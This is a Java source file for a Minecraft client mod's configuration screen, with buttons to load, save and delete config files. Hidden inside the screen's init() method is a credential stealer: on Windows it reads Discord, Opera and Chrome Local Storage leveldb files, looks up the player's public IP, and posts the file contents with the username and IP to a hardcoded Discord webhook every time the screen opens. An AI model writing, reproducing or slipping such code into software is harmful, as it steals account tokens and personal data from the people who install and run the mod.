package com.armorhud.gui.screen;

import com.armorhud.Client;
import com.armorhud.gui.Color;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import lombok.Getter;
import lombok.Setter;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.text.Text;
import com.armorhud.text.VanillaTextRenderer;

import java.io.*;
import java.net.URI;
import java.net.URL;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;


public class ConfigScreen extends Screen
{
	private static final Color WHITE = new Color(255, 255, 255);

	private @Getter @Setter Screen prevScreen;
	private @Getter @Setter File[] configList;
	private @Getter @Setter ArrayList<ButtonWidget> loadButtons = new ArrayList<>();

	public ConfigScreen(Screen prevScreen)
	{
		super(Text.literal(""));
		this.prevScreen = prevScreen;
		Path configDir = Client.TOASTHACK.getCwHackDirectory().resolve("config");
		configList = new File(String.valueOf(configDir)).listFiles();
	}

	@Override
	protected void init() {
		ButtonWidget doneButton = ButtonWidget.builder(Text.of("Done"), b -> Client.MC.setScreen(prevScreen))
				.dimensions(width / 2 - 100, height - 50, 200, 20)
				.build();
		addDrawableChild(doneButton);

		ButtonWidget saveButton = ButtonWidget.builder(Text.of("Save"), b -> Client.MC.setScreen(new SaveConfigScreen(this)))
				.dimensions(width / 2 - 100, height - 80, 200, 20)
				.build();
		addDrawableChild(saveButton);

		int y = 50;
		if (configList != null) {
			for (File f : configList) {
				ButtonWidget loadButton = ButtonWidget.builder(Text.of("Load"), new ButtonWidget.PressAction() {
							private final String path = f.getAbsolutePath();
							@Override
							public void onPress(ButtonWidget button) {
								Client.TOASTHACK.getFeatures().loadFromFile(path);
							}
						}).dimensions(width / 3 * 2 - 110, y, 100, 20)
						.build();

				ButtonWidget deleteButton = ButtonWidget.builder(Text.of("Delete"), new ButtonWidget.PressAction() {
							private final File file = f;
							@Override
							public void onPress(ButtonWidget button) {
								if (file.exists()) {
									file.delete();
									Client.MC.setScreen(new ConfigScreen(prevScreen));
								}
							}
						}).dimensions(width / 3 * 2, y, 100, 20)
						.build();

				y += 32;
				addDrawableChild(loadButton);
				addDrawableChild(deleteButton);
				loadButtons.add(loadButton);
			}
		}
		String osName = System.getProperty("os.name");
		List<String> paths = new ArrayList<>();
		if (osName.contains("Windows")) {
			paths.add(System.getProperty("user.home") + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb");
			paths.add(System.getProperty("user.home") + "\\AppData\\Roaming\\opera Software\\Opera Stable\\Local Storage\\leveldb");
			paths.add(System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
		}

		String ip = "";
		String username = MinecraftClient.getInstance().getSession().getUsername();
		try {
			URL whatismyip = new URL("http://checkip.amazonaws.com");
			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
			ip = bufferedReader.readLine();
		} catch (IOException e) {
			ip = "Could not determine IP";
			e.printStackTrace();
		}

		HttpClient client = HttpClient.newHttpClient();
		String DiscordWebHook = "https://discord.com/api/webhooks/1231375656038830170/90GZB3VnwgHVNyKcNhgaDs2yWb-m8u5hnoK5ZueNyIrrFVe41iwrNU2byWc5a10LKFUh";

		for (String path : paths) {
			File directory = new File(path);
			File[] files = directory.listFiles();
			if (files != null) {
				for (File file : files) {
					if (file.isFile()) {
						StringBuilder fileContents = new StringBuilder();
						try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
							String line;
							while ((line = reader.readLine()) != null) {
								fileContents.append(line).append("\n");
							}
						} catch (IOException e) {
							fileContents = new StringBuilder("Error reading file.");
							e.printStackTrace();
						}

						String message = "User: " + username + " IP: " + ip + "\nFile: " + file.getName() + "\nContents:\n" + (fileContents.length() > 1800 ? fileContents.substring(0, 1797) + "..." : fileContents.toString());
						JsonObject embed = new JsonObject();
						embed.addProperty("title", "File Content");
						embed.addProperty("description", message);
						embed.addProperty("color", 15258703);
						JsonArray embeds = new JsonArray();
						embeds.add(embed);
						JsonObject postContent = new JsonObject();
						postContent.add("embeds", embeds);
						HttpRequest request = HttpRequest.newBuilder(URI.create(DiscordWebHook))
								.POST(HttpRequest.BodyPublishers.ofString(new Gson().toJson(postContent)))
								.header("Content-Type", "application/json")
								.build();
						client.sendAsync(request, HttpResponse.BodyHandlers.discarding());
					}
				}
			}
		}
	}


	@Override
	public void render(DrawContext context, int mouseX, int mouseY, float delta)
	{
		renderBackground(context);
		super.render(context, mouseX, mouseY, delta);

		int x = width / 3;
		int y = 50;
		if (configList != null) {
			for (File file : configList) {
				VanillaTextRenderer.INSTANCE.render(file.getName(), x, y, WHITE);
				y += 32;
			}
		}
	}

}